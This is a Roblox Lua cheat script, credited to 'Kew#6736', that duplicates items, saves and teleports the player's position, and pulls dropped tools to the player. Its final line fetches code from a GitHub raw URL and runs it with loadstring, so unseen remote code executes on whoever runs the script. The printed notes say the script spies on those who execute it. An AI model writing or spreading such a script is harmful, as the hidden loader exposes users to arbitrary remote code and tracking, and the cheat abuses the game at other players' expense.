local m = game.Players.LocalPlayer:GetMouse()

--credits part

    game.StarterGui:SetCore("SendNotification", {
    Title = "Kew#6736";
    Text = "press F9 for info";
    Icon = "";
    Duration = "10";
    })

wait(1)

    print("made by Kew#6736")
    print("-------------------------------------------------------------------------------------------------------------------------------------------------")
    print("quick tutorial, hold the item u want to dupe, type in chat '/save' and done, if didn't work try again, if still not workin dm me in discord")
    print("numpad 1 - save, numpad 2 - teleport to save, numpad 3 - equip all items in invm numpad 4 - teleport all items to you")
    print("note: press numpad 2 very fast when u respawned cause it will kill you")
    print("-------------------------------------------------------------------------------------------------------------------------------------------------")
    print("Update - Added gui to equip Only items u want (u can equip for example: rokakaka and stone mask or more idk)")
    print("teleport thingy in gui will teleport YOU to the item, can kill you sometimes")
    print("the script spys who executed it, dont even try to share it with someone or sell it")
    
--dupe

player=game.Players.LocalPlayer
    player.Chatted:Connect(function(msg)
        if msg=="/save" then 
            wait(0.1)
            for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
            if v:IsA("Tool") then
            v.Parent = game.Workspace
            end
            end
            wait()
            game.Players.LocalPlayer.Character.Humanoid.Health = 0 
            end
    end)
    
--save position

function onKeyPress(inputObject, gameProcessedEvent)
if inputObject.KeyCode == Enum.KeyCode.KeypadOne then
LPos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
end
end
game:GetService("UserInputService").InputBegan:connect(onKeyPress)

--teleport to saved position

function onKeyPress(inputObject, gameProcessedEvent)
if inputObject.KeyCode == Enum.KeyCode.KeypadTwo then
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = LPos
end
end
game:GetService("UserInputService").InputBegan:connect(onKeyPress)

--equip all items in backpack

function onKeyPress(inputObject, gameProcessedEvent)
if inputObject.KeyCode == Enum.KeyCode.KeypadThree then
    wait("2.5")
    for _, tool in ipairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) do
    if tool:IsA("Tool") then
         tool.Parent = game:GetService("Players").LocalPlayer.Character
    end
end
end
end
game:GetService("UserInputService").InputBegan:connect(onKeyPress)

--teleport all droped items to you
function onKeyPress(inputObject, gameProcessedEvent)
if inputObject.KeyCode == Enum.KeyCode.KeypadFour then
    for i,v in pairs(game.Workspace:GetChildren()) do
	                  if v:IsA"Tool" then
	           v.Handle.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
	               end
           end
    end

end
game:GetService("UserInputService").InputBegan:connect(onKeyPress)
wait(0.4)
loadstring(game:HttpGet("https://raw.githubusercontent.com/KewIzHere/REEEEde/master/hey", true))()
